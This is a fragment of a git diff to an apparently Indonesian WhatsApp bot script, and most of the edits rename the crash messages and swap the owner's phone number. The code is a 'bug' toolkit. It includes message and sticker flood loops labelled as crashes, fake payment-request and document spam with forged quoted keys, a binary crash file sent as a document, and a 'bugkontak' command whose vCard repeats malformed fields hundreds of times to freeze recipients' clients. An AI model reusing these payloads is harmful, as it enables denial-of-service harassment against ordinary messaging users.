+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(10000)
 }
 reply(`Succes`)
@@ -939,7 +909,7 @@ if (!mek.key.fromMe) return reply('Khusus Owner Ajg!')
 let user = global.db.data.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = text
-deploy(`${m.pushName} HELLO SAYA CXZA 935 ${text ? ': ' + text : ''}`)
+deploy(`${m.pushName} HELLO SAYA © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 ${text ? ': ' + text : ''}`)
 }
 break
 //=================================================//
@@ -948,7 +918,7 @@ if (!mek.key.fromMe) return reply('Khusus Owner Ajg!')
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `HALLO AKU CXZA 935`
+ydd = `HALLO AKU 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`
 for (let i = 0; i < jumlah; i++) {
 haikal.sendMessage(m.chat, {sticker: thumb},{quoted: {
 key: { 
@@ -981,7 +951,7 @@ if (!mek.key.fromMe) return reply('Khusus Owner Ajg!')
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku CXZA 935`
+ydd = `HALLO AKU 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`
 for (let i = 0; i < jumlah; i++) {
 haikal.sendMessage(m.chat, {requestPaymentMessage: thumb},{quoted: {
 key: { 
@@ -993,7 +963,7 @@ participant: `0@s.whatsapp.net`,
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER CXZA 935`,
+"text": `MY DEVELOPER 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 }
 }
 }})
@@ -1007,7 +977,7 @@ if (!mek.key.fromMe) return reply('Khusus Owner Ajg!')
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku CXZA 935`
+ydd = `HALLO AKU 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`
 for (let i = 0; i < jumlah; i++) {
 haikal.sendMessage(m.chat, {document: thumb},{quoted: {
 key: {
@@ -1022,7 +992,7 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
 "fileLength": "64455",
 "pageCount": 1,
 "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `CXZA 935${ngazap(prefix)}`,
+"fileName": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${ngazap(prefix)}`,
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
 }
 }
@@ -1062,14 +1032,14 @@ if (isBan) throw sticBanLu(from)
 
 if (!mek.key.fromMe) return reply('Khusus Owner Ajg!')
 anuin = fs.readFileSync('./baseikal/sound/ngeselin.BIN')
-haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `CXZA 935 ${ngazap(prefix)}.BIN`, title: `CXZA 935 ${ngazap(prefix)}.BIN` }, { quoted: doc })
+haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 ${ngazap(prefix)}.BIN`, title: `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 ${ngazap(prefix)}.BIN` }, { quoted: doc })
 }
 break
 //=================================================//
 case 'bugkontak': {
 if (!mek.key.fromMe) return reply('Khusus Owner Ajg!')
 if (isBan) throw sticBanLu(from)
- const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:CXZA 935\nitem1.TEL:+6285775422460\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
+ const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓\nitem1.TEL:+6283149877456\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
 haikal.sendContact(m.chat, global.ownerr, fkontaak)
 }
 break
@@ -2016,7 +1986,7 @@ break
 //=================================================//
 case 'dvuayasi': {
 if (isBan) throw sticBanLu(from)
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `*Hai Kak ${m.pushName}*\n\n Bot Rental Prices\n⭔ 13k Per Group via E-Walet 1 Month\n⭔ 18k via pulsa 1 Month\n\n Premium Price Bot\n⭔ 8k per User 1 bulan\n\nPayment can be via Paypal/link aja/pulsa\n\nFor more details, you can chat with the owner\nhttps://wa.me/6285775422460 (Owner)\n\nDonate For Me : \n\n⭔ Paypal : https://trakteer.id/hw-mods-wa-haikal\n⭔ Saweria : https://saweria.co/hwmodswa` }, { quoted: hw })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `*Hai Kak ${m.pushName}*\n\n Bot Rental Prices\n⭔ 13k Per Group via E-Walet 1 Month\n⭔ 18k via pulsa 1 Month\n\n Premium Price Bot\n⭔ 8k per User 1 bulan\n\nPayment can be via Paypal/link aja/pulsa\n\nFor more details, you can chat with the owner\nhttps://wa.me/6283149877456 (Owner)\n\nDonate For Me : \n\n⭔ Paypal : https://trakteer.id/hw-mods-wa-haikal\n⭔ Saweria : https://saweria.co/hwmodswa` }, { quoted: hw })
 }
 break
 //=================================================//
@@ -2095,7 +2065,7 @@ const result4 = `*DOWNLOAD MEDIAFIRE*
 *Link* : ${baby1[0].link}\n
 _whoa wait zimbot processing..._
 
